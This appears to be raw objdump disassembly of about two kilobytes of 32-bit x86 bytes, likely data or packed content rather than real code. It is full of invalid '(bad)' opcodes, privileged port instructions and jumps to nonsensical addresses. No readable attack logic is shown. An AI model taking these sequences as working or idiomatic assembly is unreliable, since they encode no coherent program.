  42047c:	repnz and al,0x8c
  42047f:	cmp    al,0xa1
  420481:	push   edx
  420482:	aas    
  420483:	loopne 0x420489
  420485:	fiadd  DWORD PTR [ebx-0x3fcfaaf2]
  42048b:	sbb    ch,BYTE PTR gs:[ebx-0x18]
  42048f:	outs   dx,BYTE PTR ds:[esi]
  420490:	dec    edi
  420492:	adc    eax,0xa88ead01
  420497:	out    0x11,eax
  420499:	js     0x420451
  42049b:	aad    0x61
  42049d:	fnstcw WORD PTR [edx+0x4b]
  4204a0:	cmp    DWORD PTR [edi+0x736dc319],esi
  4204a6:	push   ebx
  4204a7:	enter  0xaeea,0xaa
  4204ab:	jmp    0x99c06a97
  4204b0:	je     0x4204ec
  4204b2:	mov    bl,0x3b
  4204b4:	inc    edx
  4204b5:	stos   BYTE PTR es:[edi],al
  4204b6:	loopne 0x42046c
  4204b8:	ins    BYTE PTR es:[edi],dx
  4204b9:	sub    al,0x94
  4204bb:	and    dl,BYTE PTR [edx-0x59]
  4204be:	pop    eax
  4204bf:	sub    edx,DWORD PTR [eax-0x16]
  4204c2:	cwde   
  4204c3:	fstp   QWORD PTR [edi]
  4204c5:	push   esp
  4204c6:	cmp    al,0x75
  4204c8:	xchg   ebp,eax
  4204c9:	xchg   edx,eax
  4204ca:	daa    
  4204cb:	adc    ebx,0x2d7144ed
  4204d1:	cmp    al,0x71
  4204d3:	jmp    0x3e4d:0x4124b2db
  4204da:	retf   
  4204db:	inc    esp
  4204dc:	into   
  4204dd:	aaa    
  4204de:	xor    ch,BYTE PTR [ebx+0x6b9c0931]
  4204e4:	div    ecx
  4204e6:	shr    esi,1
  4204e8:	or     eax,0xafd4baf8
  4204ed:	sbb    dh,BYTE PTR [ecx-0x51]
  4204f0:	loope  0x4204a2
  4204f2:	ret    
  4204f3:	inc    ebx
  4204f4:	add    eax,0x1555cbdb
  4204f9:	call   0x5dd7:0xa9f74dbd
  420500:	mov    eax,ds:0x1e59e217
  420505:	dec    esp
  420506:	xchg   eax,ecx
  420508:	mov    edx,0xb631ccdc
  42050d:	pop    ecx
  42050e:	xor    esi,edx
  420510:	push   eax
  420511:	adc    eax,0xa53f56ce
  420516:	pop    ecx
  420517:	dec    ebp
  420518:	into   
  420519:	dec    ebp
  42051a:	bnd je 0x4204aa
  42051d:	inc    esi
  42051e:	int3   
  42051f:	mov    ecx,0x8b937bab
  420524:	or     BYTE PTR [edx],ah
  420526:	add    al,0x7
  420528:	fwait
  420529:	jmp    0x6ca82c6
  42052e:	sahf   
  42052f:	aad    0x55
  420531:	sbb    dl,BYTE PTR [eax]
  420533:	icebp  
  420534:	mov    ebp,0xe7055720
  420539:	xor    edx,esp
  42053b:	scas   al,BYTE PTR es:[edi]
  42053c:	std    
  42053d:	inc    eax
  42053e:	mov    cl,0x4b
  420540:	das    
  420541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420542:	sahf   
  420543:	xchg   edx,eax
  420544:	and    BYTE PTR [edi-0x6b227ab0],cl
  42054a:	test   eax,0x5806ab1b
  42054f:	das    
  420550:	mov    al,ds:0xa34a0d94
  420555:	pop    ebx
  420556:	mov    ecx,0xe0b5ef6c
  42055b:	adc    dh,BYTE PTR [eax]
  42055d:	mov    ds:0x1b9775c3,eax
  420562:	adc    BYTE PTR [edx+0x79021134],bh
  420568:	popf   
  420569:	inc    edx
  42056a:	ds (bad) 
  42056c:	mov    ds:0xd8362ab1,al
  420571:	daa    
  420572:	call   0x2e4723d5
  420577:	retf   
  420578:	iret   
  420579:	push   eax
  42057a:	psadbw mm2,QWORD PTR [ecx]
  42057d:	push   0xea1028ab
  420582:	or     DWORD PTR [esi+edx*4],ebp
  420585:	jg     0x4205df
  420587:	test   eax,0x194d9577
  42058c:	lods   eax,DWORD PTR ds:[esi]
  42058d:	stos   DWORD PTR es:[edi],eax
  42058e:	cmp    ch,cl
  420590:	fwait
  420591:	sahf   
  420592:	les    eax,FWORD PTR [ebp+0x150536f5]
  420598:	aaa    
  420599:	dec    esp
  42059a:	(bad)  
  42059c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42059d:	mov    al,0x9a
  42059f:	aam    0xf3
  4205a1:	arpl   WORD PTR [eax-0x1c],dx
  4205a4:	iret   
  4205a5:	or     al,0x62
  4205a7:	push   cs
  4205a8:	mov    ebp,0x1baa457b
  4205ad:	xor    esp,esi
  4205af:	inc    esi
  4205b0:	fstp   QWORD PTR [ebp-0x6d]
  4205b3:	mov    ebx,ds
  4205b5:	outs   dx,DWORD PTR ds:[esi]
  4205b6:	jns    0x4205d7
  4205b8:	mov    ecx,0xf1cfa773
  4205bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205be:	and    eax,0xbd245aa1
  4205c3:	jno    0x420556
  4205c5:	jge    0x4205d9
  4205c7:	ret    0xd6cc
  4205ca:	js     0x4205d3
  4205cc:	loop   0x42060b
  4205ce:	fs adc al,0xfb
  4205d1:	pop    esp
  4205d2:	cmp    eax,edi
  4205d4:	xchg   ecx,eax
  4205d5:	cmp    BYTE PTR [bx-0x73],cl
  4205d9:	xlat   BYTE PTR ss:[ebx]
  4205db:	daa    
  4205dc:	aas    
  4205dd:	jns    0x4205e4
  4205df:	ret    
  4205e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205e1:	std    
  4205e2:	mov    al,0xdf
  4205e4:	sbb    esi,DWORD PTR [ecx+0x20]
  4205e7:	or     ch,ch
  4205e9:	jecxz  0x42066a
  4205eb:	loop   0x420641
  4205ed:	int    0xbb
  4205ef:	mov    al,0x31
  4205f1:	rcr    bh,0x32
  4205f4:	fidivr WORD PTR [eax+0x72]
  4205f7:	cmp    edx,DWORD PTR [esp+edx*1-0xe]
  4205fb:	xor    DWORD PTR [esi],ebx
  4205fd:	shl    cl,0xa3
  420600:	or     DWORD PTR ds:0xa72b92ab,esp
  420606:	mov    edi,0xb842146d
  42060b:	je     0x42060e
  42060d:	push   ebp
  42060e:	inc    eax
  42060f:	xor    ebp,0xffffff9f
  420612:	(bad)  
  420613:	jno    0x4205cc
  420615:	pop    ebx
  420616:	xchg   ebp,eax
  420617:	push   ds
  420618:	js     0x4205ca
  42061a:	inc    edx
  42061b:	loope  0x4205be
  42061d:	aam    0x46
  42061f:	lahf   
  420620:	(bad)  
  420622:	sar    dh,cl
  420624:	push   eax
  420625:	add    BYTE PTR [edi],al
  420627:	jp     0x420666
  420629:	xor    eax,0x1b065ab9
  42062e:	mov    dh,0xed
  420631:	mov    eax,0xede46002
  420636:	jne    0x42064e
  420638:	sar    DWORD PTR [edx],0xb5
  42063b:	ror    DWORD PTR [edx+edi*4],1
  42063e:	stc    
  42063f:	stc    
  420640:	imul   ebx,ecx,0x84e80333
  420646:	retf   
  420647:	cld    
  420648:	pop    ds
  420649:	and    DWORD PTR [eax+0x16],eax
  42064c:	ins    DWORD PTR es:[edi],dx
  42064d:	sahf   
  42064e:	or     ebp,DWORD PTR [edi]
  420650:	sub    eax,0xc62407b5
  420655:	aas    
  420656:	pop    esp
  420657:	dec    ecx
  420658:	and    al,0x8e
  42065a:	and    al,0x36
  42065c:	mov    BYTE PTR [eax+0x61],bh
  42065f:	sti    
  420660:	(bad)  
  420661:	into   
  420662:	scas   eax,DWORD PTR es:[edi]
  420663:	je     0x42064b
  420665:	leave  
  420666:	and    BYTE PTR [eax+ebx*1],dl
  420669:	js     0x420644
  42066b:	in     eax,dx
  42066c:	pusha  
  42066d:	fcomip st,st(2)
  42066f:	outs   dx,BYTE PTR ds:[esi]
  420670:	and    dl,bl
  420672:	mov    bl,BYTE PTR [eax-0x51672ea5]
  420678:	dec    eax
  420679:	repz dec ecx
  42067b:	sub    ebp,DWORD PTR [edi-0x69]
  42067e:	xchg   DWORD PTR [eax-0x1c],edx
  420681:	or     al,BYTE PTR [ecx+0x76422b00]
  420687:	(bad)  
  420688:	aad    0x8b
  42068a:	adc    ebp,ecx
  42068c:	sbb    esi,0x5d
  42068f:	bound  edi,QWORD PTR [esi-0x49]
  420692:	fwait
  420693:	pop    ebx
  420694:	dec    esi
  420695:	mov    bh,0x93
  420697:	inc    ebx
  420698:	pop    edi
  420699:	nop
  42069a:	dec    ebx
  42069b:	ss push ds
  42069d:	push   esp
  42069e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42069f:	and    al,0x95
  4206a1:	mov    DWORD PTR [ebx+0x4e],esp
  4206a4:	fnstcw WORD PTR [edi]
  4206a6:	push   edi
  4206a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206a8:	jle    0x42070a
  4206aa:	sub    DWORD PTR [esi+0x255ef048],0x7aca7afd
  4206b4:	iret   
  4206b5:	cmp    dh,dl
  4206b7:	xor    DWORD PTR [esi-0x55],ebx
  4206ba:	push   ebp
  4206bb:	ficom  WORD PTR [esi-0x44b778ff]
  4206c1:	loopne 0x4206d4
  4206c3:	sahf   
  4206c4:	push   ecx
  4206c5:	mov    ebp,0xe3de1d52
  4206ca:	sbb    al,BYTE PTR [esi-0x696fde13]
  4206d0:	test   DWORD PTR [ebx-0x2e],eax
  4206d3:	int    0xf7
  4206d5:	mul    bh
  4206d7:	add    bl,BYTE PTR ds:0xb42b46f6
  4206dd:	sub    BYTE PTR [esi-0x505db88b],0x3b
  4206e4:	xchg   edx,eax
  4206e5:	retf   
  4206e6:	ins    BYTE PTR es:[edi],dx
  4206e7:	(bad)  
  4206e8:	shl    BYTE PTR [edi],1
  4206ea:	push   edx
  4206eb:	xor    BYTE PTR [edx+ebx*4-0x26de14e4],dh
  4206f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206f3:	push   0x3d
  4206f5:	loope  0x4206f8
  4206f7:	stos   BYTE PTR es:[edi],al
  4206f8:	mov    ebp,0xec03e4ed
  4206fd:	cmp    dl,BYTE PTR [edi]
  4206ff:	stc    
  420700:	jge    0x420762
  420702:	out    0x78,al
  420704:	jle    0x420706
  420706:	push   ecx
  420707:	inc    ebp
  420708:	leave  
  420709:	pusha  
  42070a:	jp     0x420717
  42070c:	push   ds
  42070d:	inc    edx
  42070e:	retf   0xd3a5
  420711:	popf   
  420712:	jl     0x4206d3
  420714:	jle    0x42077a
  420716:	aas    
  420717:	loope  0x420768
  420719:	aad    0x74
  42071b:	sub    dl,BYTE PTR [esi+eiz*1+0x3c]
  42071f:	and    al,0xe6
  420721:	pop    es
  420722:	sub    BYTE PTR [ebp-0x29],ah
  420725:	shl    bl,0x23
  420728:	mov    BYTE PTR [edi-0x1db2d366],ah
  42072e:	pop    esp
  42072f:	popf   
  420730:	mov    ah,0xe2
  420732:	xchg   esp,eax
  420733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420734:	scas   eax,DWORD PTR es:[edi]
  420735:	fmul   st(0),st
  420737:	lods   eax,DWORD PTR ds:[esi]
  420738:	sub    DWORD PTR [esi-0x766d2d3b],eax
  42073e:	cli    
  42073f:	sbb    al,0x62
  420741:	call   0x881e038f
  420746:	mov    al,ds:0x7e8e1493
  42074b:	nop
  42074c:	into   
  42074d:	adc    BYTE PTR [eax+0x66],0x97
  420751:	pop    es
  420752:	adc    dl,bh
  420754:	int3   
  420755:	dec    eax
  420756:	popf   
  420757:	adc    ah,ch
  420759:	adc    DWORD PTR [edi+0x55],ebx
  42075c:	jmp    0x4206f0
  42075e:	mov    ebp,DWORD PTR ds:[ecx-0x583b09fd]
  420765:	or     dl,ch
  420767:	fadd   QWORD PTR [ebx+0x5403c701]
  42076d:	arpl   WORD PTR [eax-0x22],cx
  420770:	mov    al,0x35
  420772:	popa   
  420773:	jl     0x42070a
  420775:	jnp    0x4207b3
  420777:	popa   
  420778:	call   0x1a27:0x2c16f905
  42077f:	adc    al,0xe7
  420781:	retf   0xee25
  420784:	rcl    DWORD PTR [ebp-0x78],1
  420787:	jnp    0x4207e1
  420789:	mov    dl,0x6f
  42078b:	es ins BYTE PTR es:[edi],dx
  42078d:	jge    0x42077b
  42078f:	push   edx
  420790:	mov    dh,0xdf
  420792:	adc    eax,0x8c643b30
  420797:	cmp    dl,ch
  420799:	mov    cl,0x7
  42079b:	(bad)  
  42079c:	lods   al,BYTE PTR ds:[esi]
  42079d:	jno    0x42078c
  42079f:	in     al,0xca
  4207a1:	iret   
  4207a2:	push   0x8baa5223
  4207a7:	inc    eax
  4207a8:	imul   eax,DWORD PTR [edx],0x65
  4207ab:	int3   
  4207ac:	mov    DWORD PTR [edi+0x27],ecx
  4207af:	sbb    eax,0xeddbbbbf
  4207b4:	fld    TBYTE PTR [esp+ebp*2]
  4207b7:	push   esi
  4207b8:	lea    ebx,[esi+edx*1-0x49dff40a]
  4207bf:	imul   esp,DWORD PTR [ebx+ecx*8],0xf1a9e5b0
  4207c6:	adc    bl,ch
  4207c8:	fild   QWORD PTR [ecx]
  4207ca:	mov    eax,ds:0xbc93814f
  4207cf:	test   ecx,ebx
  4207d1:	jmp    0xc5e3e9b6
  4207d6:	imul   eax,ebp,0x11
  4207d9:	sbb    cl,dl
  4207db:	ds or  esi,esp
  4207de:	cmp    DWORD PTR [eax+ecx*8+0x7d],esi
  4207e2:	inc    esp
  4207e3:	icebp  
  4207e4:	jecxz  0x42077d
  4207e6:	sub    BYTE PTR [esi+ebx*1],0xcd
  4207ea:	xlat   BYTE PTR ds:[ebx]
  4207eb:	mov    WORD PTR ds:0x42745bf,es
  4207f1:	test   DWORD PTR [ebx+0x95203df],edi
  4207f7:	loopne 0x42077b
  4207f9:	or     eax,0xf6cc563e
  4207fe:	outs   dx,BYTE PTR ds:[esi]
  4207ff:	in     al,0xef
  420801:	enter  0xa9f3,0x78
  420805:	push   es
  420806:	retf   
  420807:	or     al,0xbc
  420809:	sub    eax,0xe8be6d9b
  42080e:	shl    BYTE PTR [edi-0x7b],1
  420811:	mov    es,WORD PTR [esi+0x16]
  420814:	adc    eax,0x520f02c4
  420819:	out    0xd1,eax
  42081b:	jnp    0x4207bc
  42081d:	jbe    0x42082a
  42081f:	and    DWORD PTR [ebx-0x17ae4162],edx
  420825:	mov    ds:0x6f34d3b0,eax
  42082a:	lods   al,BYTE PTR ds:[esi]
  42082b:	push   ss
  42082c:	stos   BYTE PTR es:[edi],al
  42082d:	xchg   edx,eax
  42082e:	adc    DWORD PTR [edx],0x11
  420831:	dec    ecx
  420832:	addr16 xor al,0x75
  420835:	mov    esp,0xaa5e2dc8
  42083a:	lods   al,BYTE PTR ss:[esi]
  42083c:	daa    
  42083d:	test   al,0xf7
  42083f:	scas   al,BYTE PTR es:[edi]
  420840:	test   al,0x77
  420842:	cmc    
  420843:	in     eax,0xa0
  420845:	jae    0x420833
  420847:	test   al,0x24
  420849:	mov    dl,0xf8
  42084b:	popa   
  42084c:	das    
  42084d:	mov    esi,DWORD PTR [ebp+0x3]
  420850:	pop    ds
  420851:	rcr    DWORD PTR [edi+0x4e],1
  420854:	adc    DWORD PTR [esi],eax
  420856:	loop   0x420805
  420858:	gs (bad) 
  42085a:	mov    esp,0x7c4cb725
  42085f:	mov    al,0xb4
  420861:	outs   dx,BYTE PTR ds:[esi]
  420862:	jbe    0x4208a0
  420864:	or     DWORD PTR ds:0x393a858,ebx
  42086a:	or     cl,0x2a
  42086d:	je     0x42083c
  42086f:	addr16 jnp 0x4208ad
  420872:	popa   
  420873:	sbb    al,0x66
  420875:	mov    BYTE PTR [ecx],dh
  420877:	xchg   ebp,eax
  420878:	cwde   
  420879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42087a:	mov    bh,0x23
  42087c:	idiv   BYTE PTR [eax+edx*2]
  42087f:	mov    WORD PTR [edi],ds
  420881:	mov    ds:0xc6aba316,al
  420886:	es xchg edx,eax
  420888:	cdq    
  420889:	sub    cl,al
  42088b:	in     al,0x6c
  42088d:	ins    DWORD PTR es:[edi],dx
  42088e:	pop    edx
  42088f:	fucomip st,st(3)
  420891:	add    al,0x86
  420893:	cmc    
  420894:	enter  0xdef4,0x77
  420898:	cmp    DWORD PTR [ebp+0x177f26d9],0x42
  42089f:	or     edx,eax
  4208a1:	push   ss
  4208a2:	fwait
  4208a3:	cmp    bh,BYTE PTR [edi-0x9b2f5c3]
  4208a9:	adc    eax,0x3dffe5ce
  4208ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208b0:	rol    DWORD PTR [esi+0x41e25059],0x88
  4208b7:	ret    0xa8e1
  4208ba:	dec    edx
  4208bb:	cmp    edx,DWORD PTR [ebx-0x15]
  4208be:	aam    0xf9
  4208c0:	xor    BYTE PTR [ebx+0x74f2a83e],ah
  4208c6:	int3   
  4208c7:	into   
  4208c8:	mov    esi,0x2ce75fa9
  4208cd:	repz mov bh,0x1a
  4208d0:	xchg   edx,eax
  4208d1:	and    al,0x23
  4208d3:	repz mov dh,0x32
  4208d6:	(bad)  
  4208d7:	xchg   edx,eax
  4208d8:	into   
  4208d9:	fiadd  WORD PTR [ebp-0x2f]
  4208dc:	adc    edx,DWORD PTR [edx]
  4208de:	fcomp  DWORD PTR [ebp+0x4d]
  4208e1:	or     BYTE PTR [esi+edi*2-0x63],0xa3
  4208e6:	hlt    
  4208e7:	lds    ebp,FWORD PTR ds:0x7f7015b6
  4208ed:	add    ah,dl
  4208ef:	mov    edi,0x525c9351
  4208f4:	cwde   
  4208f5:	imul   DWORD PTR [edx]
  4208f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208f8:	sti    
  4208f9:	repnz rcr BYTE PTR [edx*8-0x2511e46],0x5d
  420902:	out    0x1c,al
  420904:	cmp    esp,DWORD PTR [ecx+0x64]
  420907:	imul   ecx,DWORD PTR [ebx],0xffffff87
  42090a:	ret    
  42090b:	repnz inc esi
  42090d:	pop    ebx
  42090e:	sahf   
  42090f:	out    0x52,eax
  420911:	test   DWORD PTR [edx+eiz*1-0x49d365bc],esp
  420918:	fisub  WORD PTR [ecx-0x15]
  42091b:	push   edi
  42091c:	push   cs
  42091d:	cdq    
  42091e:	jecxz  0x42095a
  420920:	jmp    0xba9c7c9d
  420925:	ror    DWORD PTR [ebp+0x35],0x8f
  420929:	and    eax,0xc005a9df
  42092e:	ins    DWORD PTR es:[edi],dx
  42092f:	loopne 0x420933
  420931:	outs   dx,DWORD PTR ds:[esi]
  420932:	sub    bl,BYTE PTR [eax-0x20]
  420935:	add    BYTE PTR [ebp+edx*1+0x1ed9e026],ch
  42093c:	into   
  42093d:	xor    al,BYTE PTR [esi+0x13de3cf9]
  420943:	mov    edi,0x165459f1
  420948:	popa   
  420949:	mov    ch,0xbf
  42094b:	stc    
  42094c:	mov    ecx,DWORD PTR [eax+0x5a]
  42094f:	mov    ds:0xd5b76198,eax
  420954:	cmp    esp,DWORD PTR [edx-0x36]
  420957:	and    eax,0x6d38acd8
  42095c:	dec    eax
  42095d:	and    DWORD PTR [eax+eax*2],ecx
  420960:	add    ebx,DWORD PTR [esi]
  420962:	push   ebp
  420963:	mov    DWORD PTR [edi+0x20],ebp
  420966:	fwait
  420967:	jmp    0xae2276ea
  42096c:	add    al,0x63
  42096e:	add    esi,DWORD PTR [esi-0x1b514ca6]
  420974:	imul   DWORD PTR [eax]
  420976:	push   ds
  420977:	scas   al,BYTE PTR es:[edi]
  420978:	popa   
  420979:	mov    ds:0xe552e88e,eax
  42097e:	adc    dh,ch
  420980:	addr16 jns 0x4209c4
  420983:	call   0x96da:0x2ccd057a
  42098a:	jbe    0x420949
  42098c:	mov    ds:0x6a74b965,eax
  420991:	clc    
  420992:	pop    esp
  420993:	pop    ecx
  420994:	clc    
  420995:	or     al,0x74
  420997:	jl     0x420994
  420999:	(bad)  
  42099b:	mov    ds:0x39af6453,al
  4209a0:	cmc    
  4209a1:	mov    bh,0x5c
  4209a3:	out    dx,al
  4209a4:	inc    edi
  4209a5:	xor    esp,DWORD PTR [edx]
  4209a7:	pop    edx
  4209a8:	stos   BYTE PTR es:[edi],al
  4209a9:	push   eax
  4209aa:	inc    ebp
  4209ab:	lea    ebx,es:0xddfb7229
  4209b2:	add    ecx,eax
  4209b4:	mov    eax,0xaef24b67
  4209b9:	cwde   
  4209ba:	pop    esp
  4209bb:	loope  0x420948
  4209bd:	mov    edi,0x3d38ba7c
  4209c2:	aad    0xe8
  4209c4:	das    
  4209c5:	push   esi
  4209c6:	and    cl,ch
  4209c8:	jmp    0xe750:0xc3e460e2
  4209cf:	outs   dx,DWORD PTR ds:[esi]
  4209d0:	xchg   esp,eax
  4209d1:	xor    al,0xfb
  4209d3:	pop    esp
  4209d4:	jns    0x42096f
  4209d6:	in     al,dx
  4209d7:	pop    eax
  4209d8:	push   eax
  4209d9:	jnp    0x420a57
  4209db:	(bad)  
  4209dc:	cmp    BYTE PTR [eax-0x64],dh
  4209df:	int3   
  4209e0:	fwait
  4209e1:	xchg   esi,eax
  4209e2:	push   cs
  4209e3:	js     0x4209c2
  4209e5:	gs (bad) 
  4209e8:	sbb    ebp,edi
  4209ea:	fdivr  DWORD PTR [ebx]
  4209ec:	ja     0x420a4f
  4209ee:	in     al,dx
  4209ef:	and    ecx,DWORD PTR [ebp-0x51599790]
  4209f5:	pop    eax
  4209f6:	inc    edx
  4209f7:	push   ebp
  4209f8:	push   eax
  4209f9:	imul   ecx,DWORD PTR ds:0xc6a6055e,0xffcc24ee
  420a03:	push   ebp
  420a04:	and    dh,dh
  420a06:	push   ebp
  420a07:	xlat   BYTE PTR ds:[ebx]
  420a08:	mov    ebp,0x9114f93c
  420a0d:	shr    DWORD PTR [edi+0x6a735fa3],cl
  420a13:	or     bh,al
  420a15:	push   ds
  420a16:	or     eax,ebp
  420a18:	push   ebp
  420a19:	dec    eax
  420a1a:	xchg   edx,eax
  420a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a1c:	add    cl,BYTE PTR [edx+0x3b]
  420a1f:	push   eax
  420a20:	dec    ecx
  420a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a22:	pop    ss
  420a23:	sbb    BYTE PTR [eax-0x71c6cc53],ch
  420a29:	add    BYTE PTR [edx],cl
  420a2b:	popf   
  420a2c:	scas   al,BYTE PTR es:[edi]
  420a2d:	retf   
  420a2e:	(bad)
  420a31:	sub    ebp,DWORD PTR [eax+ecx*4]
  420a34:	inc    edi
  420a35:	in     eax,dx
  420a36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a37:	je     0x4209d9
  420a39:	add    ch,BYTE PTR [edi]
  420a3b:	(bad)  
  420a3c:	leave  
  420a3d:	outs   dx,BYTE PTR ds:[esi]
  420a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a3f:	jg     0x420a55
  420a41:	fwait
  420a42:	pop    ebp
  420a43:	les    ebp,FWORD PTR [esi]
  420a45:	push   edx
  420a46:	pop    ebp
  420a47:	cwde   
  420a48:	cmp    al,0x48
  420a4a:	cmp    eax,0xcde17f1d
  420a4f:	push   ebp
  420a50:	xchg   edx,eax
  420a51:	jp     0x420acf
  420a53:	popf   
  420a54:	inc    eax
  420a55:	adc    ah,BYTE PTR [ecx]
  420a57:	mov    eax,0xc477bed2
  420a5c:	stos   DWORD PTR es:[edi],eax
  420a5d:	xchg   ebx,eax
  420a5e:	xor    BYTE PTR [edi+0x298a14f2],al
  420a64:	dec    ebx
  420a65:	mov    dl,0x95
  420a67:	shl    eax,0xb6
  420a6a:	pop    esi
  420a6b:	dec    esi
  420a6c:	inc    ebp
  420a6d:	outs   dx,BYTE PTR ds:[esi]
  420a6e:	and    DWORD PTR [ebx-0x42d47585],ebx
  420a74:	popa   
  420a75:	bound  edi,QWORD PTR [edi+0x20]
  420a78:	mov    edi,0x1678df8b
  420a7d:	fmulp  st(6),st
  420a7f:	lahf   
  420a80:	xchg   esi,eax
  420a81:	pop    edi
  420a82:	int3   
  420a83:	cmc    
  420a84:	pop    ecx
  420a85:	jns    0x420ae9
  420a87:	enter  0xfa32,0x3d
  420a8b:	mov    eax,0xbf7e1ca0
  420a90:	add    bh,BYTE PTR [ebp+0x534a1ec9]
  420a96:	in     al,0x32
  420a98:	sbb    DWORD PTR [edx-0x62a5aebd],esp
  420a9e:	mov    edx,0x66116796
  420aa3:	and    al,0x4e
  420aa5:	mov    ah,0xe0
  420aa7:	xchg   DWORD PTR cs:[esi-0x25828e8e],esi
  420aae:	jl     0x420b00
  420ab0:	jmp    esp
  420ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ab3:	sub    DWORD PTR [ebx-0x53],0x1b
  420ab7:	daa    
  420ab8:	add    ecx,ecx
  420aba:	(bad)  
  420abb:	push   ss
  420abc:	sbb    eax,0xd6662e2f
  420ac1:	mov    ecx,0x8e2cd071
  420ac6:	and    DWORD PTR [ebx+0x5752cf33],0x21
  420acd:	cli    
  420ace:	pop    ebx
  420acf:	int    0x5e
  420ad1:	rcl    DWORD PTR [ecx+edx*4],cl
  420ad4:	out    0x7f,eax
  420ad6:	(bad)
  420ad9:	outs   dx,DWORD PTR ds:[esi]
  420ada:	sub    al,0x57
  420adc:	push   0x29
  420ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ae0:	mov    cl,BYTE PTR [esi-0x1e]
  420ae3:	int3   
  420ae4:	int    0x76
  420ae6:	sub    ebx,DWORD PTR [edx]
  420ae8:	loope  0x420a87
  420aea:	and    DWORD PTR [eax+0x5cbcdc11],ebp
  420af0:	iret   
  420af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420af2:	sbb    bh,BYTE PTR ds:0xb1ace9e3
  420af8:	repz cwde 
  420afa:	leave  
  420afb:	push   ds
  420afc:	adc    cl,BYTE PTR [eax]
  420afe:	fisubr WORD PTR [edi-0x69ec8056]
  420b04:	je     0x420b84
  420b06:	stos   BYTE PTR es:[edi],al
  420b07:	or     BYTE PTR [edi-0x4bcb46e8],0x74
  420b0e:	dec    edx
  420b0f:	inc    ebx
  420b10:	bound  ecx,QWORD PTR [edi]
  420b12:	call   0x48b5f86c
  420b17:	stc    
  420b18:	add    BYTE PTR [eax],0xfc
  420b1b:	daa    
  420b1c:	sar    edi,1
  420b1e:	call   0x4ba3ab85
  420b23:	adc    esi,DWORD PTR [ebx+0x20443e66]
  420b29:	fmul   DWORD PTR [esp+esi*1-0x66]
  420b2d:	jae    0x420b5b
  420b2f:	(bad)  [ebp-0x54d4c2bf]
  420b35:	adc    al,0x6b
  420b37:	(bad)  
  420b38:	nop
  420b39:	(bad)  
  420b3a:	out    dx,al
  420b3b:	fst    QWORD PTR [ecx+0x38]
  420b3e:	add    ah,dh
  420b40:	cli    
  420b41:	into   
  420b42:	push   esp
  420b43:	push   edi
  420b44:	jg     0x420b05
  420b46:	stc    
  420b47:	in     eax,0x3d
  420b49:	into   
  420b4a:	add    DWORD PTR [ecx+0x1e],0x62
  420b4e:	jae    0x420b17
  420b50:	int3   
  420b51:	dec    esp
  420b52:	daa    
  420b53:	enter  0x9cfc,0x5d
  420b57:	das    
  420b58:	scas   al,BYTE PTR es:[edi]
  420b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b5a:	cmc    
  420b5b:	jle    0x420b26
  420b5d:	mov    BYTE PTR [esi],ch
  420b5f:	jp     0x420ba7
  420b61:	pop    ds
  420b62:	mov    WORD PTR [ecx+edx*8+0x362db6e1],ds
  420b69:	mov    DWORD PTR [esi],esi
  420b6b:	jb     0x420bc1
  420b6d:	lods   al,BYTE PTR ds:[esi]
  420b6e:	ja     0x420bd8
  420b70:	(bad)  
  420b71:	xor    al,0x83
  420b73:	cmc    
  420b74:	dec    edx
  420b75:	sub    bh,ch
  420b77:	xchg   esp,eax
  420b78:	adc    al,0xae
  420b7a:	push   edi
  420b7b:	pop    ds
  420b7c:	add    dl,BYTE PTR [eax+0x41]
  420b7f:	sbb    eax,0xf9ca767d
  420b84:	cld    
  420b85:	gs push 0x54113eb0
  420b8b:	adc    al,0x3c
  420b8d:	mov    eax,ds:0xab18edad
  420b92:	push   0x79b2ed21
  420b97:	pop    esi
  420b98:	adc    DWORD PTR [ecx+0x3989c3cc],0x2176f5aa
  420ba2:	push   cs
  420ba3:	or     ah,BYTE PTR ds:0x8edefbf5
  420ba9:	inc    ecx
  420baa:	push   ebp
  420bab:	(bad)  
  420bac:	out    0x9d,eax
  420bae:	push   ebx
  420baf:	cli    
  420bb0:	or     eax,0x29b73f00
  420bb5:	mov    edx,0xdfab3fc2
  420bba:	dec    esp
  420bbb:	out    dx,al
  420bbc:	pop    esi
  420bbd:	fmul   DWORD PTR [eax-0x37]
  420bc0:	inc    ecx
  420bc1:	enter  0xb52,0x16
  420bc5:	mov    ah,0xd5
  420bc7:	jno    0x420b71
  420bc9:	dec    ecx
  420bca:	push   ss
  420bcb:	imul   ecx,DWORD PTR [ebp+0x78],0xee43adbf
  420bd2:	push   ebp
  420bd3:	call   0xe645:0x6d84b03f
  420bda:	adc    eax,0x552e91d2
  420bdf:	fidivr DWORD PTR [esi-0x784d9e84]
  420be5:	fs ins DWORD PTR es:[edi],dx
  420be7:	xchg   ebx,eax
  420be8:	fnstcw WORD PTR [edi]
  420bea:	popf   
  420beb:	mov    edi,0xcb338905
  420bf0:	sbb    eax,0x27875d84
  420bf5:	lods   al,BYTE PTR ds:[esi]
  420bf6:	call   0x9467:0x99acee5b
  420bfd:	sbb    eax,0xed6c564
  420c02:	xchg   dl,bl
  420c04:	cmp    BYTE PTR [edi+0x5543e252],bh
  420c0a:	pop    eax
  420c0b:	outs   dx,DWORD PTR ds:[esi]
  420c0c:	lds    edi,FWORD PTR [edi+0x26]
  420c0f:	push   cs
  420c10:	loope  0x420c56
